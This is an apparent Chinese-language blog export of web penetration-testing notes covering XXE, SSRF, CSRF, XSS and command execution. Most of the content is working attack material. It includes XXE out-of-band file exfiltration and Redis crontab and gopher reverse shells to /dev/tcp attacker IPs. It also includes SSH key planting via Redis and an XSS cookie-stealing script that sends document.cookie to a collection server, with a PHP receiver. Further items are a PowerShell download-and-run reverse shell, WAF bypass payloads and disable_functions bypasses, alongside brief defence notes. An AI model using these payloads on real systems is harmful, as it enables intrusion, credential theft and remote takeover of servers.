&lt;data&gt;&lt;name&gt;zs&lt;/name&gt;&lt;pass&gt;123&lt;/pass&gt;&lt;/data&gt;\n\n\n语法结构 一部分是标签的定义， 一部分是标签的解释，标签的解释也称为DTD\n&lt;?xml version=&quot;1.1&quot; encode=&quot;utf-8&quot;&gt;  //标识 &lt;!DOCTYPE data[  //普通实体，内部声明&lt;!ENTITY name SYSTEM &quot;http://ip:port或者http://dnslog.cn&quot;&gt; //无回显，判断SYSTEM是否可用&lt;!ENTITY pass SYSTEM &quot;/etc/passwd&quot;&gt;//本地文件读取&lt;!ENTITY %test SYSTEM &quot;http://ip/dtd文件位置&quot;&gt; %test;//远程文件读取]&gt; (需要修改底下数据为变量：&amp;name;)//标签+数据&lt;data&gt;&lt;name&gt;zs&lt;/name&gt;&lt;pass&gt;123&lt;/pass&gt;&lt;/data&gt;读文件可使用伪协议\n\n\n利用\n读文件 file:///etc/passwd  远程端口探测（内网） http://ip:port/test/ 命令执行（前提：php安装expect扩展） expect://系统命令\n\n\n数据外带\n本地服务器文件  &lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;&lt;!ENTITY % xxe &quot;&lt;!ENTITY send SYSTEM &#39;http://172.16.12.184:9000/?data=%data;&#39;&gt;&quot;&gt;%xxe; 发送文件&lt;br/&gt; &lt;!DOCTYPE user[&lt;!ENTITY % load SYSTEM &quot;http://172.16.12.184:9000/xxe.dtd&quot;&gt;%load;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/user&gt;\n\n\n各类语言支持的协议：\n\n\n\nlibxml2\nPHP\nJava\n.NET\n\n\n\nfile\nfile\nhttp\nfile\n\n\nftp\nhttp\nhttps\nhttp\n\n\nhttp\nftp\nftp\nhttps\n\n\n\nphp\nfile\nftp\n\n\n\ncompress.zlib\njar\n\n\n\n\ncompress.bzlip2\nnetdoc\n\n\n\n\ndata\nmailto\n\n\n\n\nglob\ngopher*\n\n\n\n\nphar\n\n\n\n\nXXE概述：\nXML实体：XML语言的变量，和PHP、JSP、C语言变量一样，有变量名（实体名）、变量值（实体的值）,可以通过&amp;/%引用\nXML实体类型：普通实体和参数实体，用下表总结两种实体类型：\n\n\n\n类型\n普通实体\n参数实体\n\n\n\n使用场合用\n在xml文档中\n用在DTD文档中\n\n\n声明内部\n&lt;!ENTITY entityName &quot;entityValue&quot;&gt;\n&lt;!ENTITY % entityName &quot;entityValue&quot;&gt;\n\n\n外部\n&lt;!ENTITY entityName SYSTEM &quot;外部文件url地址&quot;&gt;\n&lt;!ENTITY % entityName SYSTEM &quot;外部文件url地址&quot;&gt;\n\n\n引用方式\n&name;\n%name;声明时中间有空格，引用时没空格\n\n\nXXE漏洞原理\n概述\nXXE漏洞也叫XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件\n漏洞的产生\n对上传的xml文件没有进行过滤，导致可上传恶意xml文件\n漏洞的危害\n1、读取任意文件\n2、执行系统命令\n3、内网端口扫描\n4、攻击内网其他网站\n漏洞的防御与修复\n禁止使用外部实体，例如ibxml_disable_entity_\nloader(true)\n过滤用户提交的XML数据，防止出现非法内容\nXXEinjector.rb使用\n\n\n\n操作\n说明\n\n\n\n启动\nruby ./XXEinjector.rb\n\n\n使用\n抓取xxe数据包，在data上面加入大写的XXEINJECT  ruby XXEinjector.rb –file=D:\\x.txt –path=/etc/my.cnf –host=172.16.12.182 –httpport=9999 –phpfilter –verbose –oob=http\n\n\nSSRFSSRF（Server-sideRequestForge,服务端请求伪造）是一种由攻击者构造形成由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。主要用来探测内网信息\n存在漏洞的位置：\n1、分享：通过URL地址分享网页内容\n2、转码服务\n3、在线翻译\n4、图片加载与下载：通过URL地址加载或下载图片\n5、图片、文章收藏功能\n6、未公开的api实现以及其他调用URL的功能\n7、从URL关键字中寻找\nSSRF漏洞危害\n端口扫描\n内网Web应用指纹识别\n攻击内网Web应用\n读取本地文件\nSSRF漏洞防御与修复\n限制请求的端口只能为web端口，只允许访问HTTP和HTTPS的请求\n设置白名单，或限制内网IP，以防止对内网进行攻击\n禁止30x跳转\n屏蔽返回的详细信息\n伪协议读取\n\n\n\n协议\n常见的payload\n\n\n\nfile协议 ——读取文件\ncurl -v &#39;file:///etc/passwd&#39;\n\n\ndict协议 ——获取目标服务器端口上运行的服务版本等信息\ncurl -v &#39;dict://127.0.0.1:6379/info&#39;\n\n\ngopher协议——反弹Shell\ncurl –v &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1**** &#39; bash -i &gt;&amp; /dev/tcp/103.21.140.84/67890&gt;&amp;……&#39;\n\n\n利用\n\n\n\n方法\n说明\n\n\n\n获取正常文件\n[http://ip/ssrf/?url=www.baidu.com/robots.txt]\n\n\n内网IP探测 [http://x.x.x.x](http://x.x.x.x/) http://x.x.x.1/24\n输入内网IP，查看返回包，返回正确即存在SSRF。 注：127.0.0.1 IP不能确定存在SSRF 10.x.x.x、172.16.x.x-172.31.x.x、192.168.x.x\n\n\n端口探测 dict://x.x.x.x:80/ [gopher://x.x.x.x:80/_1](gopher://x.x.x.x:80/_1)\n当设置参数URL为内网地址时，则会泄露内网信息，比如内网的某个服务是否开放 提交参数： ?url=探测的ip:1234(不存在的端口) 返回结果： 端口没有开放，页面报错  提交参数： http://ip/ssrf/?url=探测的ip:22(开放的端口) 返回结果： 端口开放，页面返回服务相关信息\n\n\n读取系统本地文件\n利用file协议可以任意读取系统本地文件 提交参数：?url=file://c:\\windows\\system32\\drivers\\etc\\hosts\n\n\n内网Web应用指纹识别\n大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。 根据这些信息就可以针对性的搜集漏洞进行攻击。 举例： 判断phpMyAdmin是否安装以及详细版本 提交参数： ?url=http://ip/phpmyadmin/README\n\n\n快速找到内网IP\nLinux/php或java\nfile://读网卡文件、DNS配置文件\n\n注：机房IP一般为静态IP\n命令：\n\n\n\n语句\n说明\n\n\n\nfile:///etc/issue\n内容不显示系统类型，为redhat系列\n\n\nfile:///etc/redhat-relese\n\n\n\nfile:///etc/udev/reules.d/70-persistent-net.rules\ncentos6网卡名称\n\n\nfile:///etc/resolv.conf\ndns位置\n\n\nfile:///etc/sysconfig/network-scripts/ifcfg-eth0\n网卡信息\n\n\nSSRF利用Redis\nurl=dict://x.x.x.x:6379/keys+*\n\nRedis常用命令\n\n\n\n语句\n说明\n\n\n\nflushall\n清空数据\n\n\nkeys *\n查看数据\n\n\nset key value\n设置键值\n\n\nget key\n获取键的值\n\n\nconfig set dir /\n设置保存路径\n\n\nconfig set dbfilename xxx.php\n新建文件\n\n\nsave\n保存\n\n\ncrontab -e\n设置定时任务\n\n\n反弹shell\nnc -lvnp 4444        # 攻击机开启监听\n\n# 连接redis，写定时反弹shell\nredis-cli -h 192.168.24.79flushallconfig set dir /var/spool/cron/crontabsconfig set dbfilename rootset xxx &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\\n\\n&quot;        #每分钟执行一次反弹连接save\n\nssh登录\n\n\n\n语句\n说明\n\n\n\nssh-keygen -t rsa\n生成密钥\n\n\n(echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; key.txt\n写入公钥\n\n\ncat ./key.txt | redis-cli -h 192.168.24.79 -x set tide\n将公钥内容设置给redis变量（靶机ip）\n\n\nredis-cli -h 192.168.24.79\n连接\n\n\nconfig set dir /root/.ssh\n默认公私钥路径\n\n\nconfig set dbfilename authorized_keys\n写入authorized_keys\n\n\nsave\n保存\n\n\n命令执行\n主从复制，数据同步，从-&gt;主，写入.so拓展库，执行系统命令\n脚本：redis-rogue-server命令：python redis-rogue-server.py --rhost=192.168.21.61 --rport=6379 --lhost=192.168.21.112 --lport=1111\n","categories":["Web渗透"],"tags":["XXE","SSRF"]},{"title":"CSRF","url":"/article/CSRF/","content":"CSRF，（Cross-siterequestforgery），跨站请求伪造。\n强制终端用户在当前对其进行身份验证后的Web应用程序上执行非本意的操作。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数据，因为攻击者无法查看对伪造请求的响应\n一、CSRF与XSS的区别原理角度：\nXSS是将恶意的代码插入到html页面中，当用户浏览页面时，插入的html代码会被执行，从而达到最终目的。\nCSRF是一种欺骗受害者提交恶意请求的攻击。代表受害者执行非本意、恶意的操作\n其他角度：\n1、CSRF比XSS漏洞危害更高，相对XSS而言较难防御。\n2、CSRF可以做到的事情，XSS都可以做到。\n3、XSS有局限性，而CSRF没有局限性。\n4、XSS针对客户端，而CSRF针对服务端。\n5、XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。\n二、CSRF攻击的条件1、目标用户登录受信任的网站A，并在本地生成cookie\n2、目标用户身份认证未过期（直接关闭网站，未退出）的情况下，访问网站B\n方式\n\n\n\n方法\n说明\n\n\n\nGET\n1、构造修改信息的连接，短网址伪装 2、构造修改信息的html，使用src标签引用网址连接\n\n\nPOST\nburpsuite-Engagement tool-Generate CSRF PoC工具，自动生成html 注意：删除原有submit标签，使用script标签自动提交表单（添加id） &lt;script&gt;document.getElementById(&#39;xx&#39;).submit()&lt;/script&gt;\n\n\n网站克隆\nhttps://bazhan.me\n同源策略\n如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。\n受约束对象：\nDOM、Cookie、第三方插件以及XMLHttpRequest都受到同源策略的约束\n不受约束对象：\n页面中的链接，重定向以及表单提交是不会受到同源策略限制的。\n跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等带src属性的标签。\n非同源受到的限制：\nCookie、LocalStorage和IndexDB无法读取。\nDOM无法获得。\nAJAX请求能发送但是不能接收。\n三、AJAXAjax 的全称是asynchronous javascript and xml，\n用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新。\n需要jquery支持，可以通过document穿件对象方式，引入js库\ns=document.createElement(&#x27;script&#x27;)s.src=&quot;http://code.jquery.com/jquery-latest.js&quot;document.body.appendChild(s)\n\n发送get包\n$.get(&#x27;http://192.168.21.112:9000/xxxx&#x27;)\n\n发送post包\n$.ajax(&#123;  url: &quot;http://192.168.21.33/csrf/bank/self.php&quot;,  type: &quot;POST&quot;,  crossDomain: true, //设置跨域为true  xhrFields: &#123;\t\twithCredentials: true //默认情况下，标准的跨域请求是不会发送cookie的\t          &#125;,  data: &#123;   username:&quot;jiabao&quot;,   money:&quot;-90000000&quot;,   submit:&quot;%E4%BA%A4%E6%98%93&quot;  &#125;  &#125;);\n\n四、跨域方法\n\n\n方法\n说明\n\n\n\ndocument.domain跨域  若两个页面一级域名相同，只是二级域名不同，  那么浏览器可以通过设置document.domain来共享Cookie\n特点：  1、只能在父域名与子域名之间使用  2、存在安全性问题，当一个站点被攻击后，另一个站点会引起安全漏洞  3、只适用于Cookie和iframe窗口     举例：  网页A：http://a.ichunqiu.com/index.html  网页B：http://b.ichunqiu.com/index.html  设置document.domain=’ichunqiu.com’，就实现以上任意两个页面之间的通信\n\n\nJSONP跨域  利用&lt;script&gt;的src不受同源策略约束实现跨域获取数据\n存在问题：  1、存在安全性问题，需要网站双方商议基础token的身份验证  2、只能是GET，不能POST  3、可能被注入恶意代码，篡改页面内容，可以采用字符串过滤来规避此问题。     举例：  a.com/jsonp.html想得到b.com/main.js中的数据，  在a.com的jsonp.html里创建一个回调函数xxx，动态添加&lt;script&gt;元素，向服务器发送请求，  请求地址后面加上查询字符串，通过callback参数指定回调函数的名字。  请求地址为http://b.com/main.js?callback=xxx  在main.js中调用这个回调函数xxx，并且以JSON数据形式作为参数传递\n\n\nCORS跨域  CORS是一个W3C标准，允许浏览器向跨源服务器发出XMLHttpRequest请求  利用JavaScript无法控制HTTP头的特点，通过目标返回的HTTP头授权是否允许跨域访问。\n举例：  a.com想得到b.com中的内容，在b.com里面添加响应头声明允许a.com的访问，添加：  Access-Control-Allow-Origin:http://a.com  然后a.com就可以用ajax获取b.com里的数据了  注意：此方法IE8以下完全不支持，IE8-10部分支持\n\n\n","categories":["Web渗透"],"tags":["CSRF"]},{"title":"XSS","url":"/article/XSS/","content":"一、XSS漏洞的概述漏洞的介绍\nXSS又叫CSS(CrossSiteScript)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。\n\n\n\n漏洞的位置\n\n\n\n\n数据交互的地方\n1、get post cookies headers方法 2、富文本编辑器 3、各类标签插入和自定义\n\n\n数据输出的地方\n1、用户资料 2、关键词、标签、说明\n\n\n漏洞前提\n1、可以控制的输入点 2、输入能返回到前端页面上被浏览器当成脚本语言解释执行\n\n\n二、XSS危害窃取用户Cookie，冒充用户身份进入网站（常见）\n键盘记录\n客户端信息探查\nXSS getshell\n劫持用户会话，执行任意操作\n刷流量，执行弹窗广告\n传播蠕虫病毒\n…..\n三、XSS检测1、手工检测XSS使用手工检测XSS漏洞是否存在时，最重要考虑的是哪里有输入、输入的数据在什么地方输出。\n1、可得知输出位置\n输入一些敏感字符，例如&lt;、&gt;、&quot;、&#39;、()等，请求后查看HTML源码，看这些输入的字符是否被转义\n2、无法得知输出位置\n非常多的web应用程序源代码不对外公开，这时在测试XSS时就有可能无法得知输入数据到底在何处显示，比如，测试某留言板是否存在XSS，那么在留言之后，可能需要经过管理员的审核才能显示，这时无法得知输入的数据在后台管理页面处于什么状态\n2、自动检测XSSAPPSCAN、AWVS、BurpSuite等软件，都可以有效地检测XSS漏洞，但这类大型的漏扫工具除了检测XSS外，还会检测SQL注入、文件包含等漏洞，所以效率比较低。专业的XSS扫描工具可以更准确的扫描XSS漏洞，如：XSSER、XSSF。\n工具与手动相结合，才能更好地检测XSS，比如：在扫描XSS时，很多扫描器一般无法检测非常规的XSS漏洞，因为在提交留言时可能需要短信验证，验证码填写等，这是工具无法做到的。\n页面中js代码执行位置（4个–两个标签外、两个标签内）\n\n\n\n语句\n说明\n\n\n\n&lt;script&gt;alert(1)&lt;/script&gt;\nscript标签中执行 –标签外（如body中） 推荐（不用点击，直接触发）*\n\n\n&lt;script src=&quot;x.js&quot;&gt;&lt;/script&gt;\n调用执行 –标签外\n\n\n&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;\n伪协议触发（javascript不可少）–标签内\n\n\n&lt;p onclick=&quot;alert(1)&quot;&gt;&lt;/p&gt;\n事件触发 –标签内 *\n\n\nHTML实体编码\n若实体编码，则不存在xss漏洞。将&lt;、&gt;分别实体编码为&amp;lt;&amp;gt;\n注意：需要查看源码，不要用F12\n1、标签中不显示其他标签\n2、多个空格只显示一个，可用&amp;nbsp;代替空格显示。\n以&amp;开头;结尾，中间放特殊字符的英文简写或16进制数字。\n分类\n\n\n\n类型\n存储区\n插入点\n\n\n\n反射型 XSS\nURL\nHTML\n\n\n存储型 XSS\n后端数据库\nHTML\n\n\nDOM型 XSS\n后端数据库/前端存储/URL前端\nJavaScript\n\n\n四、反射型XSS概念：\n是非持久性、参数型的跨站脚本。反射型XSS的JS代码在Web应用的参数（变量）中，如搜索框的反射型XSS。\n存在位置：\n常见于通过URL传递参数的功能，如网站搜索、跳转等。\n攻击手法：\n需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面。\n反射型xss漏洞poc：\n&lt;script&gt;alert(/xss/)&lt;/script&gt;（常用）&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;\n\n五、存储型XSS概念：\n持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中。\n存在位置：\n常出现在留言板、发表评论或发表文章的地方(数据写入的地方)。\n攻击手法：\n通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。\n存储型xss漏洞poc：\n同反射型xss\n六、DOM型XSSDOM的意思：\nDOM文档对象模型(DocumentObjectModel,DOM)是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式\n漏洞概念：\n不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOM。DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。\n攻击手法：\n攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作\n常用DOM方法\n\n\n\n方法\n描述\n\n\n\ngetElementById()\n返回带有指定ID的元素\n\n\ngetElementsByTagName()\n返回带有指定标签的所有元素的节点列表\n\n\ngetElementsByClassName()\n返回包含带有指定类名的所有元素的节点列表\n\n\nappendchild()\n把新节点添加到指定节点\n\n\nremoveChild()\n删除子节点\n\n\nreplaceChild()\n替换子节点\n\n\ninsertBefore()\n在指定的子节点前面插入新的子节点\n\n\ncreateAttribute()\n创建属性节点\n\n\ncreateElement()\n创建元素节点\n\n\nDOM型XSS漏洞poc\n?message=&lt;script&gt;alert(/xss/)&lt;/script&gt;\n\n三种漏洞的区别\n存储型XSS与反射型XSS的区别\n存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里\nDOM型与其他两种XSS的区别\nDOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞\n七、XSS漏洞测试过程1、判断是否是html实体编码(查看源代码)\n单双引号尖括号等，是否转义\n&#39;&quot;&lt;&gt;()\n2、确定输出位置\n3、判断闭合符\n标签外，直接使用\n标签内，需要闭合标签\n4、绕过waf\n\n\n\n标签\n说明\n\n\n\na标签\n存在onclick、onmousemove等事件，无onerror事件\n\n\nimg标签\n存在onerror、onclick、onmousemove等事件\n\n\ninput标签\n存在onchange、onmousemove等事件，无onload、onerror事件\n\n\nsvg标签\n存在onload、onclick、onmousemove等事件\n\n\n注：onload、onerror会在页面加载完成之后立刻触发，其他都要手动触发。优先选择自动触发事件。\n八、XSS简单利用1、XSS获取管理员权限(获取cookie)——重要\n2、XSS键盘记录——重要\n3、XSS获取内网IP\nXSS获取cookie\nalert(document.cookie)\n\n自动发送请求的标签\n\n\n\n语句\n说明\n\n\n\n&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&quot;&gt;\n链接标签\n\n\n&lt;img src=&quot;&quot;&gt;\n图片标签\n\n\n&lt;script src=&quot;&quot;&gt;&lt;/script&gt;\nscript标签\n\n\n&lt;iframe src=&quot;&quot;&gt;&lt;/iframe&gt;\n内联框架标签\n\n\n&lt;video src=&quot;&quot;&gt;&lt;/video&gt;\n视频标签\n\n\n&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;\n音频标签\n\n\n通过自发送标签，将cookie值base64编码后，发送到自己的服务器，即可获取目标cookie信息\n使用&lt;script src=http:\\\\xxx&gt;&lt;/script&gt;加载压缩后的短网址，访问js文件\n\n\n\n说明\n语句\n\n\n\n发送js\ns=document.createElement(&#39;script&#39;);s.src=&#39;http://192.168.21.66:9999/cookie.php?cookie=&#39; + btoa(document.cookie);document.body.appendChild(s);\n\n\n接收php\n`&lt;?php if ($_GET[‘cookie’]) { file_put_contents(‘cookie.txt’, “IP:” . $_SERVER[‘REMOTE_ADDR’] . “\\nCookie: “ . base64_decode($_GET[‘cookie’]) . “\\n\\n”, FILE_APPEND\n\n\nXSS获取键盘记录\nwindow.onkeypress=function(key)&#123;console.log(key);&#125;\n\n公开的XSS平台\nhttps://xss.pt\nhttps://xsshs.cn\n当&lt;script&gt;标签无法使用时，可用其他标签使用dom操作，生成&lt;script&gt;标签\n注：script可以只写一半\nbeef框架\n自带hook，可控制网站\nXSS绕过方法\nXSS绕过svg img\nhtml实体编码，则不存在xss漏洞，也就不存在绕过\n实体编码三种格式\n\n\n\n&amp;lt;\n\n\n\n\n&amp;#十进制  \n\n\n\n&amp;#16进制\n\n\n\nXSS的四种构造方法\n\n\n\n构造方式\n语句\n\n\n\n利用&lt;&gt;构造HTML/JS\n&lt;script&gt;alert(/xss/)&lt;/script&gt;\n\n\n伪协议的方式构造XSS\n&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me!&lt;/a&gt;     *\n\n\n事件利用\n&lt;img src=&#39;./smile.jpg&#39;  onmouseover=&#39;alert(/xss/)&#39;&gt;\n\n\n其他标签以及手法\n&lt;svg onload=&quot;alert(/xss/)&quot;&gt; *    &lt;input onfocus=alert(/xss/) autofocus&gt;   获取焦点\n\n\n变形及绕过\n\n\n\n方法\n语句\n\n\n\n大小写\n&lt;ahREf=&quot;javaScript:alert(/xss/)&quot;&gt;clickme&lt;/a&gt; \n\n\n引号\nHTML语言中对引号的使用不敏感，但是过滤函数对引号很严格&lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot;/&gt;     &lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39;/&gt; \n\n\n左斜线/代替空格\n&lt;Img sRc=&#39;#&#39; Onerror=&quot;alert(/xss/)&quot;/&gt;   -&gt;  &lt;Img/sRc=&#39;#&#39;/Onerror=&#39;alert(/xss/)&#39;/&gt;\n\n\n回车\n添加水平制表符和回车符，分割语句，来绕过关键字检测     一些函数不可以加回车，比如事件：onmoveover、onerror等\n\n\n对标签属性值进行转码\nASCII码、十进制编码、十六进制编码、base64编码(atob解码、btoa编码)、unicode编码等  &lt;ahREf=&quot;javaScript:alert(/xss/)&quot;&gt;clickme&lt;/a&gt;   - &gt; &lt;AhREf=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot;&gt;clickme!&lt;/a&gt;     注：  可以在任何位置插入：  Tab（&amp;#9）、换行（&amp;#10）、回车（&amp;#13）  可以在头部位置插入：  SOH（&amp;#1）、STX（&amp;#2）      &lt;AhREf=&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;&gt;clickme!&lt;/a&gt;     其他：  jsfuck编码*  只能执行js代码，不能转html代码  http://www.jsfuck.com/     如&lt;img src=# onerror=alert(1)&gt;中的alert(1)\n\n\n拆分跨站\n当应用程序没有过滤XSS关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下，可使用“拆分法”执行跨站脚本代码    &lt;script&gt;z=&#39;alert&#39;&lt;/script&gt;  &lt;script&gt;z=z+&#39;(/xss/)&#39;&lt;/script&gt;  &lt;script&gt;eval(z)&lt;/script&gt;\n\n\n双写绕过\n&lt;scr&lt;script&gt;ipt&gt;  \n\n\nCSS中的变形（了解）\n使用全角字符:  width:ｅｘｐｒｅｓｓｉｏｎ(alert(/xss/))  注释会被浏览器忽略:  width:expr/*~*/ession(alert(/x~s~s/))  样式表中的[\\]和[\\0]:  &lt;style&gt;@import &#39;javasc\\ri\\0pt:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;\n\n\njsfuck编码\n\n\n\n关键词\n编码\n\n\n\nfalse\n![]\n\n\ntrue\n!![]\n\n\nundefined\n[][[]]\n\n\nNaN\n+[![]]\n\n\n0\n+[]\n\n\n1\n+!+[]\n\n\n2\n!+[]+!+[]\n\n\n10\n[+!+[]]+[+[]]\n\n\nArray\n[]\n\n\nNumber\n+[]\n\n\nString\n[]+[]\n\n\nBoolean\n![]  \n\n\nFunction\n[][&quot;filter&quot;]\n\n\neval\n[][&quot;filter&quot;][&quot;constructor&quot;](CODE)() \n\n\nwindow\n[][&quot;filter&quot;][&quot;constructor&quot;](&quot;return  this&quot;)() \n\n\n补充\nscript只能使用常规语法，html实体编码时，可用svg、img代替\n&lt;svg onload=alert(1)&gt;\n&lt;img=&quot;&quot; onerror=alert(1)&gt;\n常用编码\nhtml实体编码、jsfuck编码\nHTTP-Only绕过\n\n\n\n方法\n说明\n\n\n\nCVE-2012-0053\nApache服务器2.0-2.2版本存在个漏洞 CE-2012-0053,攻击者可通过向网站植入超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize  (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie\n\n\nHTML5的CORS特性\n详见CSRF\n\n\n","categories":["Web渗透"],"tags":["XSS"]},{"title":"命令执行","url":"/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"一、漏洞的原因及本质代码层过滤不严，应用程序直接或间接使用了动态执行命令的危险函数，并且这个函数的运行参数是可控的。当服务器没有严格过滤用户提供的参数时，就有可能导致用户提交恶意代码被服务器执行，从而造成命令执行漏洞。\n涉及到的函数\n\n\n\n函数\n说明\n\n\n\nsystem\n能够将字符串作为OS命令执行，自带输出功能\n\n\nexec()\n能将字符串作为OS命令执行，但无输出，需要输出执行结果 注意：只输出最后一行数据\n\n\nshell_exec()\n执行命令并以字符串的形式，返回完整的信息，但是函数无回显，需要输出执行结果\n\n\npassthru()\n执行外部命令，与exec()类似，但是该函数会直接将结果输出，无需输出执行\n\n\npopen()\n打开并运行一个程序文件，返回一个文件指针\n\n\n反引号(``)、[``]内的字符串，也会被解析成OS命令\n\n\n\n二、命令执行漏洞的危害1、继承Web服务器程序权限（Web用户权限），去执行系统命令\n2、继承Web服务器权限，读写文件\n3、反弹Shell\n4、控制整个网站\n5、控制整个服务器\n利用\n\n\n\n操作\n命令\n\n\n\n查看系统文件\npayload：[?cmd=type c:\\windows\\system32\\drivers\\etc\\hosts] 查看系统hosts文件\n\n\n显示当前路径\npayload：[?cmd=cd]\n\n\n显示当前权限\npayload：[?cmd=whoami]\n\n\n写文件\npayload：[?cmd=echo”x” &gt; C:\\phpStudy\\WWW\\Commmand\\shell.php] 页面没有报错，说明文件写入成功\n\n\n三、命令执行语法Windows\n\n\n\n命令格式\n含义\n\n\n\ncommand1 &amp; command2\n挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2\n\n\ncommand1 &amp;&amp; command2\n且，先后执行Command1和command2，只有command1执行成功时才执行command2\n\n\ncommand1 || command2\n或，先后执行Command1和command2，只有command1执行失败时才执行command2\n\n\ncommand1 | command2\n管道符，将command1的执行结果传递给command2\n\n\nLinux\n\n\n\n命令格式\n含义\n\n\n\ncommand1 ; command2\n分隔，先后执行Command1和command2，各自无影响\n\n\ncommand1 &amp; command2\n挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2\n\n\ncommand1 &amp;&amp; command2\n且，先后执行Command1和command2，只有command1执行成功时才执行command2\n\n\ncommand1 || command2\n或，先后执行Command1和command2，只有command1执行失败时才执行command2\n\n\ncommand1 | command2\n管道符，将command1的执行结果传递给command2\n\n\ncommand1.command2\n反引号&quot; `` &quot;，优先执行,无论command1是否执行成功\n\n\n四、命令执行漏洞的防御1、尽量少使用执行命令函数或者禁用disable_functions\n2、在进入执行命令的函数之前，对参数进行过滤，对敏感字符进行转义\n3、参数值尽量使用引号包括，并在拼接前调用addslashes进行转义\n注：windows写入用单引号，linux用双引号。\n五、反弹shell正向shell不可控，但是不受网络环境影响（自己内网连接目标公网）\n控制端-&gt;被控端，被控端需要开启监听（被控端防火墙、端口开启等难度大，不建议）\npowercat -l -p 8888 -e cmdnc x.x.x.x 8888\n\n反弹shel可控，但是需要网络可达（目标内网连接自己公网）\n被控端-&gt;控制端，控制端开启监听可控，被控端只需要连接即可，容易实现\n注：无论是哪种shell，都是控制端控制被控端。\npowercat -c x.x.x.x -p 8888 -e cmdnc -lnvp 8888\n\npowershell程序反弹shell\n(程序为powershell函数，让目标服务器可以执行powershell命令)\n从本地上传脚本\npowershell.exe -exec bypass -Command &quot;Import-Module C:\\powercat.ps1;powercat -c x.x.x.x -p 8888 -e cmd&quot;\n\n从公网服务器下载脚本\npowershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.21.66:8000/windows/powercat.ps1&#x27;);powercat -c 192.168.21.66 -p 8888 -e cmd\n\n详见反弹shell归纳笔记。\n六、绕过disable functionsdisable_functions是在/etc/php/apache2/php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数\n通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等\nphpinfo中为disable functions，默认为空，可以通过修改配置文件php.ini进行设置\n如果disable functions被启用，即使拿到webshell，命令执行依然受到限制\n绕过方法\n\n\n\n方法\n说明\n\n\n\n常规绕过： exec,shell_exec,system,passthru,popen,proc_open\n黑名单不全绕过 （蚁剑自带黑名单绕过）\n\n\n利用环境变量LD_PRELOAD绕过 LD_PRELOAD是Linux系统的下的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库。 通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的\n前提条件 1、能够上传自己的.so文件 2、能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数 3、存在mail()、imap_mail()、mb_send_mail()和error_log()等可以控制PHP启动外部程序并能执行的函数  利用过程 